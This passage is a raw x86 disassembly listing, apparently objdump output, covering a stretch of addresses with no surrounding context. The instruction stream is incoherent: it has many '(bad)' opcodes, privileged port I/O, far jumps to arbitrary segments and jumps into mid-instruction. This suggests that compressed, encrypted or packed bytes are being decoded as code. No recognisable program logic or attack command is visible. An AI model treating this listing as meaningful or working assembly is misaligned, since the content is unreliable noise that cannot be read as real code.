  4194a6:	test   BYTE PTR [edi+0x4f],ah
  4194a9:	div    eax
  4194ab:	sahf   
  4194ac:	or     eax,0x51c5f227
  4194b1:	test   al,0xce
  4194b3:	inc    edx
  4194b4:	leave  
  4194b5:	je     0x41948e
  4194b7:	int3   
  4194b8:	xlat   BYTE PTR ds:[ebx]
  4194b9:	enter  0x7936,0xa
  4194bd:	adc    eax,0x8a616c85
  4194c2:	mov    BYTE PTR [edx-0x6b0e2dc],bl
  4194c8:	repnz pop ebp
  4194ca:	mov    al,ds:0x8f3b3a27
  4194cf:	push   ebx
  4194d0:	test   DWORD PTR [edx],eax
  4194d2:	retf   0x954a
  4194d5:	leave  
  4194d6:	or     eax,0x92a43982
  4194db:	lods   eax,DWORD PTR ds:[esi]
  4194dc:	sbb    bh,BYTE PTR [ecx-0x586a2cf0]
  4194e2:	ror    al,0x52
  4194e5:	scas   eax,DWORD PTR es:[edi]
  4194e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194e7:	popa   
  4194e8:	jge    0x4194bf
  4194ea:	idiv   BYTE PTR [ebx-0x38431c63]
  4194f0:	xor    BYTE PTR [esi],bl
  4194f2:	shl    BYTE PTR [ebx+0x7dd55614],1
  4194f8:	or     DWORD PTR [ebp+0x33849fe5],ebp
  4194fe:	mov    bh,0x85
  419500:	mov    ebx,0xb759acdc
  419505:	stos   BYTE PTR es:[edi],al
  419506:	add    eax,ebx
  419508:	sub    DWORD PTR [eax],esi
  41950a:	in     al,dx
  41950b:	rol    esi,0x43
  41950e:	ror    DWORD PTR [edx-0x51],1
  419511:	mov    esp,0xbf5e0746
  419516:	adc    eax,0x387ef255
  41951b:	add    ah,dh
  41951d:	daa    
  41951e:	js     0x41951a
  419520:	sub    al,0x95
  419522:	push   cs
  419523:	std    
  419524:	ret    
  419525:	add    dl,dh
  419527:	test   al,0x65
  419529:	imul   edi,DWORD PTR ds:0xfe67017f,0x5b
  419530:	in     eax,dx
  419531:	or     ch,BYTE PTR [eiz*8+0x795d36f7]
  419538:	mov    esi,0x6d065a1a
  41953d:	mov    ecx,0x126f22a8
  419542:	adc    BYTE PTR [eax-0x60],bh
  419545:	dec    esi
  419546:	shl    BYTE PTR [eax+0x33],cl
  419549:	jbe    0x41952a
  41954b:	mov    dl,0x90
  41954d:	mov    BYTE PTR [esp+edi*2-0x6e],bl
  419551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419552:	mul    DWORD PTR [eax]
  419554:	in     eax,0x5d
  419556:	dec    eax
  419557:	lea    ebp,[ebp+0x27]
  41955a:	and    edi,DWORD PTR [edi]
  41955c:	push   es
  41955d:	sbb    ecx,eax
  41955f:	or     al,dh
  419561:	fidiv  DWORD PTR [eax-0x45]
  419564:	int3   
  419565:	ja     0x4195b6
  419567:	pop    esp
  419568:	sti    
  419569:	inc    eax
  41956a:	xor    BYTE PTR [edx],0x70
  41956d:	daa    
  41956e:	push   esi
  41956f:	aad    0x54
  419571:	pusha  
  419572:	aad    0x44
  419574:	clc    
  419575:	or     DWORD PTR [edx],0x41
  419578:	(bad)  
  419579:	stc    
  41957a:	lahf   
  41957b:	(bad)  
  41957c:	in     al,dx
  41957d:	pop    es
  41957e:	sbb    al,0xbd
  419580:	push   cs
  419581:	popa   
  419582:	inc    edx
  419583:	and    ebx,ebx
  419585:	inc    ebp
  419586:	and    edx,eax
  419588:	xor    cl,bl
  41958a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41958b:	in     eax,dx
  41958c:	gs mov ebx,0xd19e4211
  419592:	(bad)  
  419593:	pushf  
  419594:	out    dx,eax
  419595:	loop   0x41958a
  419597:	or     DWORD PTR [edi-0x6df79254],esi
  41959d:	push   ebp
  41959e:	(bad)  
  41959f:	sub    DWORD PTR [ecx-0x5127f5ec],ebp
  4195a5:	mov    eax,0x13e05b43
  4195aa:	loopne 0x41953d
  4195ac:	shr    DWORD PTR [edi],1
  4195ae:	das    
  4195af:	jmp    0x4195db
  4195b1:	mov    ds:0xff97ce67,eax
  4195b6:	repz pop ds
  4195b8:	fadd   QWORD PTR [edx+0x32]
  4195bb:	es leave 
  4195bd:	adc    BYTE PTR [edx],ch
  4195bf:	outs   dx,BYTE PTR ds:[esi]
  4195c0:	push   esi
  4195c1:	pop    ss
  4195c2:	arpl   cx,si
  4195c4:	jmp    0x4195a7
  4195c6:	cld    
  4195c7:	dec    ebp
  4195c8:	cdq    
  4195c9:	ror    BYTE PTR [ecx+0x2a90cc08],1
  4195cf:	xchg   esi,eax
  4195d0:	(bad)  
  4195d1:	push   ds
  4195d2:	adc    DWORD PTR [edx],edi
  4195d4:	push   eax
  4195d5:	mov    dl,0x22
  4195d7:	and    al,0x1
  4195d9:	dec    eax
  4195da:	fld    st(3)
  4195dc:	and    eax,DWORD PTR [edx+edx*4-0x6d05e45]
  4195e3:	mov    ebp,0x9e4ec440
  4195e8:	pop    ss
  4195e9:	fadd   DWORD PTR [edx]
  4195eb:	lea    esp,cs:[ebp-0x10]
  4195ef:	lods   eax,DWORD PTR ds:[esi]
  4195f0:	not    esp
  4195f2:	mov    edi,0xcffe8864
  4195f7:	dec    ebp
  4195f8:	xchg   ebp,ebp
  4195fa:	pop    eax
  4195fb:	seto   BYTE PTR [ebx+edi*1+0x2]
  419600:	mov    cl,0x30
  419602:	out    dx,eax
  419603:	and    DWORD PTR [esp+ebx*1-0x61e52764],ecx
  41960a:	outs   dx,BYTE PTR ds:[esi]
  41960b:	sbb    edi,DWORD PTR [eax+0x37f0b6ea]
  419611:	push   esi
  419612:	dec    eax
  419613:	(bad)  
  419616:	bound  edi,QWORD PTR [edx-0x22]
  419619:	test   al,0xfc
  41961b:	fdiv   QWORD PTR [edi]
  41961d:	nop
  41961e:	adc    eax,0xeb1c001
  419623:	mov    eax,0xa4f80086
  419628:	lds    edx,FWORD PTR [ebp+ebp*4+0x70]
  41962c:	clc    
  41962d:	call   DWORD PTR [ecx+0x370e3f3a]
  419633:	mov    bl,0xe1
  419635:	cmp    dx,cx
  419638:	and    BYTE PTR [eax+0x5c],0xdf
  41963c:	ret    
  41963d:	sub    BYTE PTR [esi+0x4f],0xfd
  419641:	int    0xe4
  419643:	enter  0x3894,0x86
  419647:	retf   0x6d64
  41964a:	mov    ds:0x613f7f39,al
  41964f:	leave  
  419650:	mov    edx,0x29ae3162
  419655:	add    BYTE PTR [esp+edi*4-0x5d],dl
  419659:	jmp    0x9b9c:0x4efbcfde
  419660:	jecxz  0x4196bd
  419662:	ja     0x41960f
  419664:	jg     0x41969e
  419666:	loopne 0x419624
  419668:	addr16 mov ebp,0xf3c79d7a
  41966e:	iret   
  41966f:	adc    edx,edi
  419671:	pop    ebp
  419672:	push   ebx
  419673:	jle    0x4196ce
  419675:	and    eax,0xa8f29127
  41967a:	imul   edx,DWORD PTR [edi-0x3],0xffffffc3
  41967e:	lea    esi,[ebp-0x3be45d7b]
  419684:	ds ss ins BYTE PTR es:[edi],dx
  419687:	iret   
  419688:	sub    dl,0xe1
  41968b:	cld    
  41968c:	and    DWORD PTR [eax],edi
  41968e:	(bad)  
  41968f:	loope  0x4196b0
  419691:	jno    0x419649
  419693:	cld    
  419694:	jmp    0x419685
  419696:	dec    esp
  419697:	adc    DWORD PTR [esi+0x2d],eax
  41969a:	fcomp  QWORD PTR [ecx-0x5a0260d9]
  4196a0:	push   es
  4196a1:	repnz aas 
  4196a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196a4:	push   es
  4196a5:	dec    edi
  4196a6:	mov    bh,0x71
  4196a8:	ins    BYTE PTR es:[edi],dx
  4196a9:	(bad)  
  4196aa:	(bad)  
  4196ab:	out    0x62,eax
  4196ad:	cwde   
  4196ae:	loop   0x41969b
  4196b0:	xor    BYTE PTR [edi-0x56342dfe],bh
  4196b6:	(bad)  
  4196b7:	rcl    dh,cl
  4196b9:	xor    DWORD PTR [edx],esi
  4196bb:	mov    dl,0x81
  4196bd:	pusha  
  4196be:	dec    ecx
  4196bf:	ret    0x4a98
  4196c2:	faddp  st(7),st
  4196c4:	mov    ecx,0x5d0c12b3
  4196c9:	mov    bl,0xdf
  4196cb:	bound  ebp,QWORD PTR [ebp+0x904a2da]
  4196d1:	je     0x419685
  4196d3:	clc    
  4196d4:	fld    QWORD PTR [eax+edx*2]
  4196d7:	pop    eax
  4196d8:	ror    DWORD PTR [ebp+0x38],0xa4
  4196dc:	std    
  4196dd:	sub    BYTE PTR [ebx-0x42],0x85
  4196e1:	mov    ss,WORD PTR [esi]
  4196e3:	dec    edi
  4196e4:	adc    edx,0x5
  4196e7:	jae    0x4196bb
  4196e9:	mov    ds:0x534917d5,eax
  4196ee:	into   
  4196ef:	xchg   BYTE PTR [edx+0x55b7f7b5],bl
  4196f5:	test   DWORD PTR ds:0x29b229e5,ebp
  4196fb:	daa    
  4196fc:	and    eax,0xf6d1d06
  419701:	adc    bh,al
  419703:	jecxz  0x419694
  419705:	add    ecx,ecx
  419707:	pop    ss
  419708:	stos   DWORD PTR es:[edi],eax
  419709:	xor    eax,0xfb16082c
  41970e:	aas    
  41970f:	fdiv   DWORD PTR [edx]
  419711:	and    esi,esp
  419713:	ins    DWORD PTR es:[edi],dx
  419714:	xchg   ecx,eax
  419715:	scas   eax,DWORD PTR es:[edi]
  419716:	into   
  419717:	lods   al,BYTE PTR ds:[esi]
  419718:	in     al,dx
  419719:	test   eax,0x6fbdbe3
  41971e:	pop    edx
  41971f:	jp     0x4196fc
  419721:	pop    ebp
  419722:	add    eax,0x8b093a22
  419727:	repz and al,0x70
  41972a:	out    dx,al
  41972b:	popf   
  41972c:	push   edi
  41972d:	pop    esp
  41972e:	adc    al,0x47
  419730:	sbb    bh,BYTE PTR [esi]
  419732:	popf   
  419733:	shr    ah,cl
  419735:	fisub  DWORD PTR [ebx]
  419737:	push   esp
  419738:	test   DWORD PTR [ecx+ebx*8-0x77],ebx
  41973c:	arpl   di,dx
  41973e:	outs   dx,BYTE PTR ds:[esi]
  41973f:	mov    esi,0x9e6a2691
  419744:	mov    ch,0x6f
  419746:	cmp    al,0x7
  419748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419749:	fistp  QWORD PTR [edi+0x3c]
  41974c:	sbb    dh,BYTE PTR [ebp+0x5c]
  41974f:	mov    esi,DWORD PTR [ecx-0x77aaa2c3]
  419755:	das    
  419756:	jmp    0x9584d7d2
  41975b:	mov    ebp,0x50e053c6
  419760:	mov    edi,0x6218ed97
  419765:	mov    eax,0x7561dc50
  41976a:	sub    BYTE PTR [edi],bl
  41976c:	sub    BYTE PTR [edi+0x12ed1132],dh
  419772:	pop    ds
  419773:	add    esi,DWORD PTR [esi]
  419775:	ins    BYTE PTR es:[edi],dx
  419776:	push   edi
  419777:	inc    ebx
  419778:	fisub  DWORD PTR [edi]
  41977a:	mov    ebp,0x56c725de
  41977f:	adc    DWORD PTR [ecx],edx
  419781:	loop   0x419741
  419783:	scas   al,BYTE PTR es:[edi]
  419784:	data16 (bad) 
  419787:	or     ah,BYTE PTR ds:0x5d277e1e
  41978d:	int    0x38
  41978f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419790:	sbb    DWORD PTR [ebx-0x3f02656c],ecx
  419796:	ret    
  419797:	ja     0x4197da
  419799:	in     eax,0xc0
  41979b:	sbb    DWORD PTR [ecx+0x33],eax
  41979e:	pop    es
  41979f:	mov    BYTE PTR [eax-0x7fbdd58f],cl
  4197a5:	dec    eax
  4197a6:	or     cl,BYTE PTR [edi+0x64]
  4197a9:	pop    ebx
  4197aa:	sbb    DWORD PTR ds:[edi-0x39caa0fb],ecx
  4197b1:	js     0x41973a
  4197b3:	lods   al,BYTE PTR ds:[esi]
  4197b4:	mov    ebp,0x8da71c27
  4197b9:	iret   
  4197ba:	or     BYTE PTR [esi+0x7d],bh
  4197bd:	xchg   ebx,eax
  4197be:	lods   al,BYTE PTR ds:[esi]
  4197bf:	xlat   BYTE PTR ds:[ebx]
  4197c0:	in     eax,dx
  4197c1:	mov    al,ds:0x792be421
  4197c6:	cld    
  4197c7:	xor    ch,BYTE PTR [esi]
  4197c9:	pop    ecx
  4197ca:	mov    ds:0x5e654b2d,eax
  4197cf:	jo     0x4197c2
  4197d1:	xchg   DWORD PTR [ebx],edi
  4197d3:	jmp    0x4197cb
  4197d5:	push   ebx
  4197d6:	(bad)  
  4197d7:	lock clc 
  4197d9:	or     eax,0x54d383aa
  4197de:	add    eax,0xa1f083a4
  4197e3:	jge    0x41976e
  4197e5:	adc    DWORD PTR cs:[ecx-0x2f],edx
  4197e9:	cmp    eax,0xe7997ab2
  4197ee:	daa    
  4197ef:	sub    al,0xd1
  4197f1:	out    0x44,eax
  4197f3:	cli    
  4197f4:	push   cs
  4197f5:	imul   esp,DWORD PTR [ebx-0x7dbc7f0d],0x79
  4197fc:	in     al,0xd5
  4197fe:	leave  
  4197ff:	fidiv  WORD PTR [ebx-0x5c43b27]
  419805:	ffree  st(3)
  419807:	cwde   
  419808:	push   ebp
  419809:	scas   al,BYTE PTR es:[edi]
  41980a:	leave  
  41980b:	(bad)  [eax-0x3448c40e]
  419811:	stos   DWORD PTR es:[edi],eax
  419812:	aam    0x80
  419814:	repnz sar DWORD PTR [edx],cl
  419817:	and    edi,eax
  419819:	test   DWORD PTR [edx-0x67b26170],esi
  41981f:	xor    eax,0x564992ff
  419824:	bound  edi,QWORD PTR [eax]
  419826:	push   esi
  419827:	jo     0x4197d5
  419829:	mov    dl,0x17
  41982b:	icebp  
  41982c:	fisub  WORD PTR [edi]
  41982e:	xor    al,0xf1
  419830:	outs   dx,DWORD PTR ds:[esi]
  419831:	(bad)  
  419832:	push   esi
  419833:	mov    eax,ds:0x2c33220e
  419838:	data16 icebp 
  41983a:	or     al,0xa8
  41983c:	add    dl,BYTE PTR [ebp+0x251cc0a3]
  419842:	ss push 0xc2571f1d
  419848:	xor    eax,0xc687ef0a
  41984d:	push   ds
  41984e:	adc    edi,0x1b8bdc48
  419854:	xchg   dh,al
  419856:	sbb    dh,BYTE PTR [eax-0x77b84150]
  41985c:	call   DWORD PTR [edi+0x3388c5c]
  419862:	cli    
  419863:	icebp  
  419864:	cmp    al,0x50
  419866:	stos   BYTE PTR es:[edi],al
  419867:	punpckldq mm2,DWORD PTR [ebx]
  41986a:	aam    0xd7
  41986c:	dec    ebx
  41986d:	mov    al,0xc4
  41986f:	xor    eax,0xc0b74e57
  419874:	(bad)  [edx+0x6e]
  419877:	sbb    ch,BYTE PTR [edi]
  419879:	mov    WORD PTR [ebx],ds
  41987b:	inc    eax
  41987c:	test   DWORD PTR [edx-0x5d],esp
  41987f:	mov    ch,0x9d
  419881:	dec    ebx
  419882:	and    DWORD PTR [ebp+0x595064a],0x6fffc2e9
  41988c:	sub    ch,ch
  41988e:	mov    ecx,0x39c41e51
  419893:	add    BYTE PTR [ebx-0x44f9e1ca],ah
  419899:	test   al,0x74
  41989b:	xor    al,0x66
  41989d:	jmp    0x42d2fd49
  4198a2:	mov    DWORD PTR [esi],esi
  4198a4:	xchg   edi,eax
  4198a5:	xchg   edi,eax
  4198a6:	adc    esi,eax
  4198a8:	leave  
  4198a9:	xchg   esp,eax
  4198aa:	lock leave 
  4198ac:	daa    
  4198ad:	or     BYTE PTR [edx-0x6ff4e966],0xa4
  4198b4:	sbb    BYTE PTR ds:0x56fed5a,0xc0
  4198bb:	sub    ebp,DWORD PTR [ebp-0x33c21d96]
  4198c1:	jne    0x41989b
  4198c3:	cdq    
  4198c4:	sub    DWORD PTR [ecx],0x47
  4198c7:	adc    al,ch
  4198c9:	push   ecx
  4198ca:	xlat   BYTE PTR ds:[ebx]
  4198cb:	sbb    DWORD PTR [ecx],edx
  4198cd:	adc    BYTE PTR [ebx-0x8dad7c5],0x85
  4198d4:	sar    BYTE PTR [edx-0x4d0117e5],0x9d
  4198db:	jo     0x41994e
  4198dd:	in     eax,0x9
  4198df:	enter  0xd931,0x22
  4198e3:	mov    dl,0xba
  4198e5:	pop    edx
  4198e6:	sbb    eax,0x11ef55a1
  4198eb:	cmp    al,0xc
  4198ed:	mov    ecx,0xedbf5101
  4198f2:	xchg   ebx,eax
  4198f3:	rol    BYTE PTR [ecx+0x253c5b24],0x6f
  4198fa:	fstp   QWORD PTR [esi+0x39167b20]
  419900:	mov    ebx,DWORD PTR [edi-0xf]
  419903:	mov    WORD PTR [esp+ecx*2-0x4d030800],cs
  41990a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990b:	sub    al,0x47
  41990d:	inc    ebp
  41990e:	pop    edx
  41990f:	fnsave [edi+0x4c]
  419912:	or     al,0xfd
  419914:	fist   DWORD PTR [ecx]
  419916:	inc    ecx
  419917:	push   0x1211224a
  41991c:	jns    0x4198ea
  41991e:	sbb    eax,0x5d5aca5b
  419923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419924:	jbe    0x41993b
  419926:	push   0x1c3cee11
  41992b:	popf   
  41992c:	inc    edi
  41992d:	and    BYTE PTR [ebp+0x37ffc8b9],ch
  419933:	mov    ds:0x8e11232e,eax
  419938:	aaa    
  419939:	aas    
  41993a:	dec    eax
  41993b:	pop    ecx
  41993c:	(bad)  
  41993d:	pop    edx
  41993e:	jb     0x4199b6
  419940:	mov    eax,0xad2c410f
  419945:	(bad)  
  419946:	leave  
  419947:	inc    esp
  419948:	enter  0xf769,0xfb
  41994c:	aam    0x7e
  41994e:	nop
  41994f:	mov    cl,0x91
  419951:	in     al,dx
  419952:	(bad)  
  419953:	cmp    eax,0xf8323d03
  419958:	dec    esp
  419959:	sub    al,0xa9
  41995b:	ror    BYTE PTR [edx+ecx*2],0xf6
  41995f:	enter  0xd8a2,0x1
  419963:	movq   mm0,mm0
  419966:	or     al,0x41
  419968:	pop    edx
  419969:	mov    ch,0x75
  41996b:	lds    ebp,FWORD PTR [eax-0x58a7e0a6]
  419971:	loop   0x419918
  419973:	and    edi,DWORD PTR [ebp+0x1c97073a]
  419979:	or     BYTE PTR [esi],0x9a
  41997c:	xor    eax,0x10903f0f
  419981:	or     BYTE PTR [eax],dh
  419983:	xchg   dh,ah
  419985:	xor    BYTE PTR ds:0xce902653,0xb2
  41998c:	data16 loopne 0x4199b5
  41998f:	pop    ebp
  419990:	(bad)  
  419992:	sbb    ch,BYTE PTR [esi-0x28e67d84]
  419998:	mov    ebx,0x9e7c676d
  41999d:	jbe    0x419981
  41999f:	(bad)  
  4199a0:	into   
  4199a1:	inc    edi
  4199a2:	push   ebp
  4199a3:	(bad)  
  4199a4:	sub    al,0xd9
  4199a6:	mov    ebp,0xa69359ab
  4199ab:	adc    al,0x93
  4199ad:	xchg   esi,eax
  4199ae:	inc    edi
  4199af:	lods   eax,DWORD PTR ds:[esi]
  4199b0:	xor    edi,edx
  4199b2:	outs   dx,DWORD PTR ds:[esi]
  4199b3:	loop   0x41999e
  4199b5:	ja     0x4199a8
  4199b7:	push   edx
  4199b8:	fsubr  QWORD PTR [ecx+0x1d435bd8]
  4199be:	push   ebp
  4199bf:	pop    es
  4199c0:	inc    esp
  4199c1:	inc    esp
  4199c2:	retf   0x58a
  4199c5:	mov    esi,edx
  4199c7:	mov    al,0x5f
  4199c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4199ca:	inc    ecx
  4199cb:	push   ebx
  4199cc:	(bad)  
  4199ce:	adc    al,0x83
  4199d0:	cli    
  4199d1:	or     dh,dh
  4199d3:	ror    BYTE PTR [ebp+eax*2+0x77d4fe3],0x6
  4199db:	push   edx
  4199dc:	push   cs
  4199dd:	ret    0xb0e7
  4199e0:	outs   dx,DWORD PTR ds:[esi]
  4199e1:	ret    
  4199e2:	push   ebx
  4199e3:	das    
  4199e4:	(bad)  
  4199e5:	and    edx,DWORD PTR [edi*8-0x71a9eda8]
  4199ec:	popf   
  4199ed:	scas   eax,DWORD PTR es:[edi]
  4199ee:	test   BYTE PTR [edi+eax*8+0x4],dl
  4199f2:	mov    ah,0xad
  4199f4:	imul   DWORD PTR [esi-0x68]
  4199f7:	scas   al,BYTE PTR es:[edi]
  4199f8:	jnp    0x4199db
  4199fa:	fisttp QWORD PTR [eax]
  4199fc:	mov    ds:0xaa09bf4d,eax
  419a01:	rcr    BYTE PTR [esi-0x3a096fd1],1
  419a07:	inc    esi
  419a08:	mov    edi,0xcfba5466
  419a0d:	enter  0xe0c9,0x72
  419a11:	or     eax,0xcf02996c
  419a16:	sub    ah,BYTE PTR [edx-0x7df4b705]
  419a1c:	pop    ds
  419a1d:	jg     0x419a10
  419a1f:	inc    esp
  419a20:	mov    cl,0x1d
  419a22:	jns    0x4199dc
  419a24:	push   0xd8517fbf
  419a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a2a:	fwait
  419a2b:	stc    
  419a2c:	push   es
  419a2d:	lods   eax,DWORD PTR ds:[esi]
  419a2e:	jl     0x419a3a
  419a30:	jecxz  0x419aa2
  419a32:	bound  ebx,QWORD PTR [ebx]
  419a34:	sub    al,0x64
  419a36:	xor    edx,DWORD PTR [esi+0x1b9164ba]
  419a3c:	fiadd  DWORD PTR [ebx+0x24209f69]
  419a42:	adc    DWORD PTR [eax-0xa7a6a93],edx
  419a48:	xchg   ebx,eax
  419a49:	inc    eax
  419a4a:	mov    al,ds:0xb5ebddb0
  419a4f:	inc    edi
  419a50:	retf   
  419a51:	sbb    eax,0xed77aab6
  419a56:	add    esi,DWORD PTR [eax]
  419a58:	dec    esi
  419a59:	xchg   BYTE PTR [edi-0x52],cl
  419a5c:	pusha  
  419a5d:	jmp    0x419a29
  419a5f:	es or  eax,0x3a5fc5ad
  419a65:	loop   0x419a52
  419a67:	mov    esp,0xfff5a246
  419a6c:	xor    eax,0x15c0f891
  419a71:	jp     0x419a38
  419a73:	out    0x46,al
  419a75:	dec    eax
  419a76:	push   0xc5b9a482
  419a7b:	aas    
  419a7c:	aam    0x68
  419a7e:	xchg   esp,eax
  419a7f:	leave  
  419a80:	sub    DWORD PTR [ebp-0x62],eax
  419a83:	out    0xb1,al
  419a85:	inc    ebx
  419a86:	xor    al,0x5b
  419a88:	lock xchg DWORD PTR [edi+eax*8+0x2],esi
  419a8d:	cmp    eax,0x18f17b37
  419a92:	and    esi,DWORD PTR [ebx]
  419a94:	fidiv  WORD PTR [edx-0x21b156e4]
  419a9a:	ss push ecx
  419a9c:	data16 hlt 
  419a9e:	cmp    cl,BYTE PTR [ebx+0x4a]
  419aa1:	inc    ecx
  419aa2:	sbb    BYTE PTR [esi+0x6c7fc0b6],bl
  419aa8:	leave  
  419aa9:	fdiv   DWORD PTR [eax]
  419aab:	jne    0x419aba
  419aad:	xor    DWORD PTR [edi+0x3bf43c9b],ebp
  419ab3:	fcomi  st,st(4)
  419ab5:	sbb    DWORD PTR [ebp-0x22608785],0xb18363a1
  419abf:	xchg   BYTE PTR [ecx],dl
  419ac1:	ja     0x419b3a
  419ac3:	mov    eax,ds:0x3b541b49
  419ac8:	jg     0x419a6b
  419aca:	lods   al,BYTE PTR ds:[esi]
  419acb:	push   esi
  419acc:	pop    ss
  419acd:	test   BYTE PTR [edi-0xc],dl
  419ad0:	inc    ebp
  419ad1:	xor    bh,ch
  419ad3:	cmc    
  419ad4:	push   ss
  419ad5:	sub    BYTE PTR [ebx],dl
  419ad7:	rol    DWORD PTR [eax-0x20867a62],0xbb
  419ade:	scas   al,BYTE PTR es:[edi]
  419adf:	fsub   DWORD PTR [eax+0x4e467381]
  419ae5:	out    0x34,al
  419ae7:	adc    eax,0x19e635f7
  419aec:	inc    ecx
  419aed:	aaa    
  419aee:	xchg   edx,eax
  419aef:	xchg   esi,eax
  419af0:	in     al,dx
  419af1:	out    dx,al
  419af2:	xchg   ebp,eax
  419af3:	inc    esp
  419af4:	jo     0x419b27
  419af6:	jne    0x419adb
  419af8:	and    eax,0x6be19cae
  419afd:	shl    DWORD PTR [edx],cl
  419aff:	cwde   
  419b00:	iret   
  419b01:	adc    ah,bl
  419b03:	pop    ecx
  419b04:	retf   0x7282
  419b07:	push   0x1c672043
  419b0c:	cmp    al,0x79
  419b0e:	sub    eax,esp
  419b10:	mov    ah,0x77
  419b12:	(bad)  
  419b13:	repnz or dl,BYTE PTR [eax-0x6d]
  419b17:	and    al,0x25
  419b19:	adc    al,0x44
  419b1b:	loopne 0x419b93
  419b1d:	stc    
  419b1e:	mov    ebp,0xc1402f25
  419b23:	cmp    bl,ah
  419b25:	pop    ss
  419b26:	mov    cl,0xfe
  419b28:	fwait
  419b29:	arpl   WORD PTR [eax+eiz*8],cx
  419b2c:	mov    al,0x6a
  419b2e:	fld    st(1)
  419b30:	(bad)  
  419b31:	jb     0x419b0c
  419b33:	xchg   BYTE PTR [ebx+0x37c4b88d],bh
  419b39:	adc    DWORD PTR ds:0x69ddd0cb,0xffffffae
  419b40:	sti    
  419b41:	mov    al,ds:0xdfe46816
  419b46:	jmp    0xb14f:0xd0bf77b
  419b4d:	mov    ds:0xb00d81b9,al
  419b52:	pusha  
  419b53:	cli    
  419b54:	or     edx,DWORD PTR [edx+0x6f9643e0]
  419b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b5c:	adc    ah,BYTE PTR ds:0xba037a41
  419b62:	pop    ebp
  419b63:	out    dx,eax
  419b64:	pop    eax
  419b65:	mov    ebp,0x9b699a46
  419b6a:	scas   al,BYTE PTR es:[edi]
  419b6b:	pusha  
  419b6c:	cs inc ebp
  419b6e:	icebp  
  419b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b70:	rcl    DWORD PTR [esi+0x6379fb4],1
  419b76:	cli    
  419b77:	adc    DWORD PTR [esi],esp
  419b79:	mov    ds:0x265196e,al
  419b7e:	dec    ebx
  419b7f:	push   eax
  419b80:	nop
  419b81:	mov    edi,0x8a80aec9
  419b86:	jnp    0x419b5f
  419b88:	ja     0x419b35
  419b8a:	in     al,0xf4
  419b8c:	ret    0x4bca
  419b8f:	ins    DWORD PTR es:[edi],dx
  419b90:	jns    0x419bb5
  419b92:	mov    edx,ecx
  419b94:	ds sbb esi,esi
  419b97:	mov    es,ecx
  419b99:	dec    ebp
  419b9a:	or     BYTE PTR [eax+0x1e],cl
  419b9d:	add    bh,0xeb
  419ba0:	stos   BYTE PTR es:[edi],al
  419ba1:	dec    edi
  419ba2:	xchg   edi,eax
  419ba3:	push   edi
  419ba4:	dec    ebx
  419ba5:	outs   dx,DWORD PTR ds:[esi]
  419ba6:	add    bl,BYTE PTR [esi]
  419ba8:	xchg   BYTE PTR [edi+0x78fa9c6c],al
  419bae:	repz imul ecx,DWORD PTR [edi+0x5559bf03],0xffffffb4
  419bb6:	fsub   st,st(7)
  419bb8:	or     ecx,ebx
  419bba:	loopne 0x419bdb
  419bbc:	add    dl,BYTE PTR [edx]
  419bbe:	adc    eax,0xa32c4a80
  419bc3:	mov    bh,BYTE PTR [edx+0x0]
  419bc6:	sti    
  419bc7:	jbe    0x419b90
  419bc9:	push   esp
  419bca:	rcr    bh,0x5b
  419bcd:	dec    ebx
  419bce:	jbe    0x419c44
  419bd0:	jmp    0xc78977f5
  419bd5:	int3   
  419bd6:	lods   eax,DWORD PTR ds:[esi]
  419bd7:	mov    bh,BYTE PTR [eax-0x40]
  419bda:	test   DWORD PTR ds:0x853b555f,esi
  419be0:	inc    esp
  419be1:	sub    eax,0x85a24f23
  419be6:	sub    al,0x5a
  419be8:	mov    al,0xfc
  419bea:	fcmovb st,st(3)
  419bec:	xor    ah,BYTE PTR [edi+eiz*8-0x4075942f]
  419bf3:	not    DWORD PTR [ebp+0x4e8fd048]
  419bf9:	xchg   edi,eax
  419bfa:	push   ss
  419bfb:	and    edx,ebx
  419bfd:	sub    dh,ch
  419bff:	pop    edx
  419c00:	add    eax,0x4231369d
  419c05:	sahf   
  419c06:	mov    bh,0x45
  419c08:	inc    esp
  419c09:	sub    eax,0x6e7a5bdb
  419c0e:	shl    dl,0x39
  419c11:	bound  eax,QWORD PTR [eax-0x6cf6df00]
  419c17:	push   ebp
  419c18:	lock dec ebx
  419c1a:	and    ah,dl
  419c1c:	enter  0x423a,0xc6
  419c20:	(bad)  
  419c21:	mov    al,ds:0xa8eb9cfe
  419c26:	into   
  419c27:	dec    ebp
  419c28:	push   ebp
  419c29:	sbb    DWORD PTR [edx],edx
  419c2b:	loope  0x419ca9
  419c2d:	popf   
  419c2e:	cli    
  419c2f:	sbb    ecx,DWORD PTR [edx]
  419c31:	and    DWORD PTR [ebx-0x484a83c0],ebx
  419c37:	jmp    0x419c68
  419c39:	jg     0x419bc3
  419c3b:	or     BYTE PTR [ebx+0x47],ch
  419c3e:	fldenv [ecx]
  419c40:	push   cs
  419c41:	jo     0x419c16
  419c43:	jbe    0x419bd1
  419c45:	sbb    ebx,DWORD PTR [edi]
  419c47:	push   ds
  419c48:	dec    ebx
  419c49:	mov    ecx,0xa555780a
  419c4e:	sub    eax,0x667126e0
  419c53:	dec    esi
  419c54:	push   edi
  419c55:	xchg   esp,eax
  419c56:	and    BYTE PTR [eax+0x6a],dl
  419c59:	pop    eax
  419c5a:	in     al,0x95
  419c5c:	ficomp DWORD PTR ds:0x23ef2f2f
  419c62:	ret    
  419c63:	daa    
  419c64:	cmp    edi,DWORD PTR [ebx]
  419c66:	push   ebp
  419c67:	pop    edi
  419c68:	in     al,0xf6
  419c6a:	dec    esp
  419c6b:	iret   
  419c6c:	ror    DWORD PTR [ebx-0x2a],cl
  419c6f:	sbb    esp,eax
  419c71:	test   DWORD PTR [ebp-0x36],ebp
  419c74:	fnstsw WORD PTR [ecx+0x69]
  419c77:	sbb    BYTE PTR [ebp-0x5f82044d],ch
